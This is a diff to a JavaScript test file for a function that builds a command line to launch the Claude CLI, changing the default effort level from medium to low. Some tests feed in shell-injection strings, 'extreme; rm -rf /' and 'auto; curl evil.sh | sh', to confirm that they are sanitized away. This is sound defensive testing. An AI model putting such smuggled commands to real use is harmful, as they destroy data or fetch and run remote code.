@@ -128,15 +128,15 @@ test('buildClaudeBase: emits --effort <level> for every valid level', () => {
   }
 });
 
-test('buildClaudeBase: effort defaults to medium when omitted', () => {
-  assert.ok(buildClaudeBase('auto', 'opus').endsWith(' --effort medium'));
-  assert.ok(buildClaudeBase('auto', 'opus', 'loopboard-opus').includes(' --effort medium '));
+test('buildClaudeBase: effort defaults to low when omitted', () => {
+  assert.ok(buildClaudeBase('auto', 'opus').endsWith(' --effort low'));
+  assert.ok(buildClaudeBase('auto', 'opus', 'loopboard-opus').includes(' --effort low '));
 });
 
-test('buildClaudeBase: an invalid effort falls back to medium rather than reaching the shell line raw', () => {
+test('buildClaudeBase: an invalid effort falls back to low rather than reaching the shell line raw', () => {
   for (const bad of ['extreme; rm -rf /', 'HIGH', '', 'ultracode', null, 5, {}]) {
     const line = buildClaudeBase('auto', 'opus', undefined, bad);
-    assert.ok(line.endsWith(' --effort medium'), `expected ${JSON.stringify(bad)} -> medium`);
+    assert.ok(line.endsWith(' --effort low'), `expected ${JSON.stringify(bad)} -> low`);
     assert.ok(!line.includes('extreme') && !line.includes('rm -rf'), 'the payload never reaches the line');
   }
 });
@@ -153,10 +153,10 @@ test('buildLoopCommand: the bootstrap prompt carries no effort ceiling (t-cffc);
 test('buildClaudeBase single-quotes the --model so glob metachars (haiku[1m]) do not expand', () => {
   assert.equal(
     buildClaudeBase('auto', 'haiku[1m]'),
-    "claude --permission-mode auto --model 'haiku[1m]' --effort medium"
+    "claude --permission-mode auto --model 'haiku[1m]' --effort low"
   );
   // A plain id is quoted too — harmless, and keeps one code path.
-  assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus' --effort medium");
+  assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus' --effort low");
 });
 
 // t-2b89: the session name is what matches a slot to its `~/.claude/sessions/<pid>.json`, so it
@@ -183,7 +183,7 @@ test('sanitizePermissionMode: passes valid through, falls back to auto otherwise
 
 test('buildClaudeBase sanitizes an injected permissionMode so the shell line stays safe', () => {
   const line = buildClaudeBase('auto; curl evil.sh | sh', 'opus');
-  assert.equal(line, "claude --permission-mode auto --model 'opus' --effort medium");
+  assert.equal(line, "claude --permission-mode auto --model 'opus' --effort low");
   assert.ok(!line.includes('curl'), 'the injected payload never reaches the shell line');
 });
 
